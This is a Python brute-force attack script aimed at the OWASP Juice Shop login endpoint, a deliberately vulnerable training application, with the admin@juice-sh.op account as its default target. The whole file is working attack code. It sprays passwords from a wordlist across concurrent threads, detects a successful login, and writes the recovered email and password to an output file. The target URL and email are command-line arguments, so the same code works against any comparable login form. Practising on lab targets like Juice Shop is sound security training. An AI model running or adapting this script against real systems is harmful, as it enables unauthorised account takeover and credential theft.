import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import json

found = threading.Event()
counter_lock = threading.Lock()
attempt_count = 0
total_passwords = 0


def attempt_password(args_tuple):
    index, password, url, email, output = args_tuple
    global attempt_count

    if found.is_set():
        return False

    password = password.strip()
    data = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
        with counter_lock:
            attempt_count += 1
            current = attempt_count

        if response.status_code == 200 and "authentication" in response.text:
            found.set()
            print(f"\n[SUCCESS] Password found: {password} (attempt {current}/{total_passwords})")
            if output:
                with open(output, "a") as out:
                    out.write(f"[SUCCESS] {email}:{password} @ {url}\n")
                print(f"[INFO] Result saved to {output}")
            return True
        else:
            print(f"[-] [{current}/{total_passwords}] Tried: {password}")
    except requests.RequestException as e:
        with counter_lock:
            attempt_count += 1
            current = attempt_count
        print(f"[WARNING] [{current}/{total_passwords}] Error trying: {password} ({e})")

    return False


def main():
    global total_passwords

    parser = argparse.ArgumentParser(description="OWASP Juice Shop Brute-Force Attack Script")
    parser.add_argument("--url", default="http://localhost:3000/rest/user/login", help="Target login URL (default: http://localhost:3000/rest/user/login)")
    parser.add_argument("--email", default="admin@juice-sh.op", help="Email to attack (default: admin@juice-sh.op)")
    parser.add_argument("--wordlist", default="top10000.txt", help="Path to wordlist file (default: top10000.txt)")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("--output", "-o", help="File to save successful results to")
    args = parser.parse_args()

    try:
        with open(args.wordlist, "r", encoding="latin-1") as f:
            passwords = f.readlines()

        total_passwords = len(passwords)
        print(f"[INFO] Loaded {total_passwords} passwords from {args.wordlist}")
        print(f"[INFO] Target: {args.url} | Email: {args.email} | Threads: {args.threads}\n")

        task_args = [(i, pw, args.url, args.email, args.output) for i, pw in enumerate(passwords, 1)]

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for result in executor.map(attempt_password, task_args):
                if result:
                    break
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {args.wordlist}")
    except KeyboardInterrupt:
        print("\n[INFO] Script interrupted by user.")


if __name__ == "__main__":
    main()
